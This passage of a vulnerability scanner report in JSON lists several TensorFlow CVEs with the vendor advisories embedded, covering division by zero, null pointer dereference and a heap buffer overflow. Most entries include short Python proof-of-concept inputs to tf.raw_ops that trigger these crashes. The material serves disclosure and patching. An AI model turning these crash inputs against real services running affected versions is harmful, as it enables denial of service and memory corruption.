                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29517",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29517"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29517",
              "help": {
                "text": "Vulnerability CVE-2021-29517\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29517](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29517)\n### Impact\nA malicious user could trigger a division by 0 in `Conv3D` implementation:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 23, 1])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/42033603003965bffac51ae171b51801565e002d/tensorflow/core/kernels/conv_ops_3d.cc#L143-L145) does a modulo operation based on user controlled input:\n\n```cc\n  const int64 out_depth = filter.dim_size(4);\n  OP_REQUIRES(context, in_depth % filter_depth == 0, ...);\n```\n\nThus, when `filter` has a 0 as the fifth element, this results in a division by 0.\n\nAdditionally, if the shape of the two tensors is not valid, an Eigen assertion can be triggered, resulting in a program crash:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n\nThe shape of the two tensors must follow the constraints specified in the [op description](https://www.tensorflow.org/api_docs/python/tf/raw_ops/Conv3D).\n\n### Patches\nWe have patched the issue in GitHub commit [799f835a3dfa00a4d852defa29b15841eea9d64f](https://github.com/tensorflow/tensorflow/commit/799f835a3dfa00a4d852defa29b15841eea9d64f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29517**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29517](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29517)|\n\n### Impact\nA malicious user could trigger a division by 0 in `Conv3D` implementation:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 23, 1])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/42033603003965bffac51ae171b51801565e002d/tensorflow/core/kernels/conv_ops_3d.cc#L143-L145) does a modulo operation based on user controlled input:\n\n```cc\n  const int64 out_depth = filter.dim_size(4);\n  OP_REQUIRES(context, in_depth % filter_depth == 0, ...);\n```\n\nThus, when `filter` has a 0 as the fifth element, this results in a division by 0.\n\nAdditionally, if the shape of the two tensors is not valid, an Eigen assertion can be triggered, resulting in a program crash:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n\nThe shape of the two tensors must follow the constraints specified in the [op description](https://www.tensorflow.org/api_docs/python/tf/raw_ops/Conv3D).\n\n### Patches\nWe have patched the issue in GitHub commit [799f835a3dfa00a4d852defa29b15841eea9d64f](https://github.com/tensorflow/tensorflow/commit/799f835a3dfa00a4d852defa29b15841eea9d64f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29549",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29549"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29549",
              "help": {
                "text": "Vulnerability CVE-2021-29549\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29549](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29549)\n### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.QuantizedAdd`:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([68, 228], shape=[2, 1], dtype=tf.quint8)\ny = tf.constant([], shape=[2, 0], dtype=tf.quint8)\n\nmin_x = tf.constant(10.723421015884028)\nmax_x = tf.constant(15.19578006631113)\nmin_y = tf.constant(-5.539003866682977)\nmax_y = tf.constant(42.18819949559947)\n\ntf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/6f26b3f3418201479c264f2a02000880d8df151c/tensorflow/core/kernels/quantized_add_op.cc#L289-L295) computes a modulo operation without validating that the divisor is not zero.\n\n```cc\nvoid VectorTensorAddition(const T* vector_data, float min_vector,\n                          float max_vector, int64 vector_num_elements,\n                          const T* tensor_data, float min_tensor,\n                          float max_tensor, int64 tensor_num_elements,\n                          float output_min, float output_max, Toutput* output) {\n  for (int i = 0; i \u003c tensor_num_elements; ++i) {\n    const int64 vector_i = i % vector_num_elements;\n    ...\n  }\n}\n```\n\nSince `vector_num_elements` is [determined based on input shapes](https://github.com/tensorflow/tensorflow/blob/6f26b3f3418201479c264f2a02000880d8df151c/tensorflow/core/kernels/quantized_add_op.cc#L522-L544), a user can trigger scenarios where this quantity is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [744009c9e5cc5d0447f0dc39d055f917e1fd9e16](https://github.com/tensorflow/tensorflow/commit/744009c9e5cc5d0447f0dc39d055f917e1fd9e16).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29549**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29549](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29549)|\n\n### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.QuantizedAdd`:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([68, 228], shape=[2, 1], dtype=tf.quint8)\ny = tf.constant([], shape=[2, 0], dtype=tf.quint8)\n\nmin_x = tf.constant(10.723421015884028)\nmax_x = tf.constant(15.19578006631113)\nmin_y = tf.constant(-5.539003866682977)\nmax_y = tf.constant(42.18819949559947)\n\ntf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/6f26b3f3418201479c264f2a02000880d8df151c/tensorflow/core/kernels/quantized_add_op.cc#L289-L295) computes a modulo operation without validating that the divisor is not zero.\n\n```cc\nvoid VectorTensorAddition(const T* vector_data, float min_vector,\n                          float max_vector, int64 vector_num_elements,\n                          const T* tensor_data, float min_tensor,\n                          float max_tensor, int64 tensor_num_elements,\n                          float output_min, float output_max, Toutput* output) {\n  for (int i = 0; i \u003c tensor_num_elements; ++i) {\n    const int64 vector_i = i % vector_num_elements;\n    ...\n  }\n}\n```\n\nSince `vector_num_elements` is [determined based on input shapes](https://github.com/tensorflow/tensorflow/blob/6f26b3f3418201479c264f2a02000880d8df151c/tensorflow/core/kernels/quantized_add_op.cc#L522-L544), a user can trigger scenarios where this quantity is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [744009c9e5cc5d0447f0dc39d055f917e1fd9e16](https://github.com/tensorflow/tensorflow/commit/744009c9e5cc5d0447f0dc39d055f917e1fd9e16).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29548",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29548"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29548",
              "help": {
                "text": "Vulnerability CVE-2021-29548\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29548](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29548)\n### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:\n\n```python\nimport tensorflow as tf\n\nt = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nt_min = tf.constant(-10.0, dtype=tf.float32)\nt_max = tf.constant(-10.0, dtype=tf.float32)\nm = tf.constant([], shape=[0], dtype=tf.quint8)\nm_min = tf.constant(-10.0, dtype=tf.float32)\nm_max = tf.constant(-10.0, dtype=tf.float32)\nv = tf.constant([], shape=[0], dtype=tf.quint8)\nv_min = tf.constant(-10.0, dtype=tf.float32)\nv_max = tf.constant(-10.0, dtype=tf.float32)\nbeta = tf.constant([], shape=[0], dtype=tf.quint8)\nbeta_min = tf.constant(-10.0, dtype=tf.float32)\nbeta_max = tf.constant(-10.0, dtype=tf.float32)\ngamma = tf.constant([], shape=[0], dtype=tf.quint8)\ngamma_min = tf.constant(-10.0, dtype=tf.float32)\ngamma_max = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  variance_epsilon=0.1, scale_after_normalization=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f/tensorflow/core/kernels/quantized_batch_norm_op.cc) does not validate all constraints specified in the [op`s contract](https://www.tensorflow.org/api_docs/python/tf/raw_ops/QuantizedBatchNormWithGlobalNormalization).\n\n### Patches \nWe have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team",
                "markdown": "**Vulnerability CVE-2021-29548**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29548](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29548)|\n\n### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:\n\n```python\nimport tensorflow as tf\n\nt = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nt_min = tf.constant(-10.0, dtype=tf.float32)\nt_max = tf.constant(-10.0, dtype=tf.float32)\nm = tf.constant([], shape=[0], dtype=tf.quint8)\nm_min = tf.constant(-10.0, dtype=tf.float32)\nm_max = tf.constant(-10.0, dtype=tf.float32)\nv = tf.constant([], shape=[0], dtype=tf.quint8)\nv_min = tf.constant(-10.0, dtype=tf.float32)\nv_max = tf.constant(-10.0, dtype=tf.float32)\nbeta = tf.constant([], shape=[0], dtype=tf.quint8)\nbeta_min = tf.constant(-10.0, dtype=tf.float32)\nbeta_max = tf.constant(-10.0, dtype=tf.float32)\ngamma = tf.constant([], shape=[0], dtype=tf.quint8)\ngamma_min = tf.constant(-10.0, dtype=tf.float32)\ngamma_max = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  variance_epsilon=0.1, scale_after_normalization=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f/tensorflow/core/kernels/quantized_batch_norm_op.cc) does not validate all constraints specified in the [op`s contract](https://www.tensorflow.org/api_docs/python/tf/raw_ops/QuantizedBatchNormWithGlobalNormalization).\n\n### Patches \nWe have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team"
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29541",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29541"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29541",
              "help": {
                "text": "Vulnerability CVE-2021-29541\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29541](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29541)\n### Impact\nAn attacker can trigger a dereference of a null pointer in `tf.raw_ops.StringNGrams`:\n\n```python\nimport tensorflow as tf\n\ndata=tf.constant([``] * 11, shape=[11], dtype=tf.string)\n\nsplits = [0]*115\nsplits.append(3)\ndata_splits=tf.constant(splits, shape=[116], dtype=tf.int64)\n\ntf.raw_ops.StringNGrams(data=data, data_splits=data_splits, separator=b`Ss`,\n                        ngram_widths=[7,6,11],\n                        left_pad=`ABCDE`, right_pad=b`ZYXWVU`,\n                        pad_width=50, preserve_short_sequences=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L67-L74) does not fully validate the `data_splits` argument. This would result in [`ngrams_data`](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L106-L110) to be a null pointer when the output would be computed to have 0 or negative size.\n\nLater writes to the output tensor would then cause a null pointer dereference.\n\n### Patches\nWe have patched the issue in GitHub commit [ba424dd8f16f7110eea526a8086f1a155f14f22b](https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b).\n    \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29541**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29541](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29541)|\n\n### Impact\nAn attacker can trigger a dereference of a null pointer in `tf.raw_ops.StringNGrams`:\n\n```python\nimport tensorflow as tf\n\ndata=tf.constant([``] * 11, shape=[11], dtype=tf.string)\n\nsplits = [0]*115\nsplits.append(3)\ndata_splits=tf.constant(splits, shape=[116], dtype=tf.int64)\n\ntf.raw_ops.StringNGrams(data=data, data_splits=data_splits, separator=b`Ss`,\n                        ngram_widths=[7,6,11],\n                        left_pad=`ABCDE`, right_pad=b`ZYXWVU`,\n                        pad_width=50, preserve_short_sequences=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L67-L74) does not fully validate the `data_splits` argument. This would result in [`ngrams_data`](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L106-L110) to be a null pointer when the output would be computed to have 0 or negative size.\n\nLater writes to the output tensor would then cause a null pointer dereference.\n\n### Patches\nWe have patched the issue in GitHub commit [ba424dd8f16f7110eea526a8086f1a155f14f22b](https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b).\n    \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29591",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29591"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29591",
              "help": {
                "text": "Vulnerability CVE-2021-29591\nSeverity: high\nFixed Version: 2.4.2\nLink: [CVE-2021-29591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29591)\n### Impact\nTFlite graphs must not have loops between nodes. However, this condition was not checked and an attacker could craft models that would result in infinite loop during evaluation. In certain cases, the infinite loop would be replaced by stack overflow due to too many recursive calls.\n\nFor example, the [`While` implementation](https://github.com/tensorflow/tensorflow/blob/106d8f4fb89335a2c52d7c895b7a7485465ca8d9/tensorflow/lite/kernels/while.cc) could be tricked into a scneario where both the body and the loop subgraphs are the same. Evaluating one of the subgraphs means calling the `Eval` function for the other and this quickly exhaust all stack space.\n    \n### Patches \nWe have patched the issue in GitHub commit [9c1dc920d8ffb4893d6c9d27d1f039607b326743](https://github.com/tensorflow/tensorflow/commit/9c1dc920d8ffb4893d6c9d27d1f039607b326743) (for the `While` operator) and in GitHub commit [c6173f5fe66cdbab74f4f869311fe6aae2ba35f4](https://github.com/tensorflow/tensorflow/commit/c6173f5fe66cdbab74f4f869311fe6aae2ba35f4) (in general).\n    \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29591**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.4.2|[CVE-2021-29591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29591)|\n\n### Impact\nTFlite graphs must not have loops between nodes. However, this condition was not checked and an attacker could craft models that would result in infinite loop during evaluation. In certain cases, the infinite loop would be replaced by stack overflow due to too many recursive calls.\n\nFor example, the [`While` implementation](https://github.com/tensorflow/tensorflow/blob/106d8f4fb89335a2c52d7c895b7a7485465ca8d9/tensorflow/lite/kernels/while.cc) could be tricked into a scneario where both the body and the loop subgraphs are the same. Evaluating one of the subgraphs means calling the `Eval` function for the other and this quickly exhaust all stack space.\n    \n### Patches \nWe have patched the issue in GitHub commit [9c1dc920d8ffb4893d6c9d27d1f039607b326743](https://github.com/tensorflow/tensorflow/commit/9c1dc920d8ffb4893d6c9d27d1f039607b326743) (for the `While` operator) and in GitHub commit [c6173f5fe66cdbab74f4f869311fe6aae2ba35f4](https://github.com/tensorflow/tensorflow/commit/c6173f5fe66cdbab74f4f869311fe6aae2ba35f4) (in general).\n    \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-29515",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29515"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29515",
              "help": {
                "text": "Vulnerability CVE-2021-29515\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29515](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29515)\n### Impact\nThe implementation of [`MatrixDiag*` operations](https://github.com/tensorflow/tensorflow/blob/4c4f420e68f1cfaf8f4b6e8e3eb857e9e4c3ff33/tensorflow/core/kernels/linalg/matrix_diag_op.cc#L195-L197) does not validate that the tensor arguments are non-empty:\n\n```cc\n      num_rows = context-\u003einput(2).flat\u003cint32\u003e()(0);\n      num_cols = context-\u003einput(3).flat\u003cint32\u003e()(0);\n      padding_value = context-\u003einput(4).flat\u003cT\u003e()(0); \n``` \n\nThus, users can trigger null pointer dereferences if any of the above tensors are null:\n\n```python\nimport tensorflow as tf\n\nd = tf.convert_to_tensor([],dtype=tf.float32)\np = tf.convert_to_tensor([],dtype=tf.float32)\ntf.raw_ops.MatrixDiagV2(diagonal=d, k=0, num_rows=0, num_cols=0, padding_value=p)\n```\n\nChanging from `tf.raw_ops.MatrixDiagV2` to `tf.raw_ops.MatrixDiagV3` still reproduces the issue.\n\n### Patches\nWe have patched the issue in GitHub commit [a7116dd3913c4a4afd2a3a938573aa7c785fdfc6](https://github.com/tensorflow/tensorflow/commit/a7116dd3913c4a4afd2a3a938573aa7c785fdfc6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29515**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29515](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29515)|\n\n### Impact\nThe implementation of [`MatrixDiag*` operations](https://github.com/tensorflow/tensorflow/blob/4c4f420e68f1cfaf8f4b6e8e3eb857e9e4c3ff33/tensorflow/core/kernels/linalg/matrix_diag_op.cc#L195-L197) does not validate that the tensor arguments are non-empty:\n\n```cc\n      num_rows = context-\u003einput(2).flat\u003cint32\u003e()(0);\n      num_cols = context-\u003einput(3).flat\u003cint32\u003e()(0);\n      padding_value = context-\u003einput(4).flat\u003cT\u003e()(0); \n``` \n\nThus, users can trigger null pointer dereferences if any of the above tensors are null:\n\n```python\nimport tensorflow as tf\n\nd = tf.convert_to_tensor([],dtype=tf.float32)\np = tf.convert_to_tensor([],dtype=tf.float32)\ntf.raw_ops.MatrixDiagV2(diagonal=d, k=0, num_rows=0, num_cols=0, padding_value=p)\n```\n\nChanging from `tf.raw_ops.MatrixDiagV2` to `tf.raw_ops.MatrixDiagV3` still reproduces the issue.\n\n### Patches\nWe have patched the issue in GitHub commit [a7116dd3913c4a4afd2a3a938573aa7c785fdfc6](https://github.com/tensorflow/tensorflow/commit/a7116dd3913c4a4afd2a3a938573aa7c785fdfc6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29535",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29535"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29535",
              "help": {
                "text": "Vulnerability CVE-2021-29535\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29535](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29535)\n### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedMul` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)\ny = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)\nmin_x = tf.constant([], dtype=tf.float32)\nmax_x = tf.constant([], dtype=tf.float32)\nmin_y = tf.constant([], dtype=tf.float32)\nmax_y = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/87cf4d3ea9949051e50ca3f071fc909538a51cd0/tensorflow/core/kernels/quantized_mul_op.cc#L287-L290) assumes that the 4 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc \nconst float min_x = context-\u003einput(2).flat\u003cfloat\u003e()(0);\nconst float max_x = context-\u003einput(3).flat\u003cfloat\u003e()(0);\nconst float min_y = context-\u003einput(4).flat\u003cfloat\u003e()(0);\nconst float max_y = context-\u003einput(5).flat\u003cfloat\u003e()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat\u003cT\u003e()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [efea03b38fb8d3b81762237dc85e579cc5fc6e87](https://github.com/tensorflow/tensorflow/commit/efea03b38fb8d3b81762237dc85e579cc5fc6e87).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security 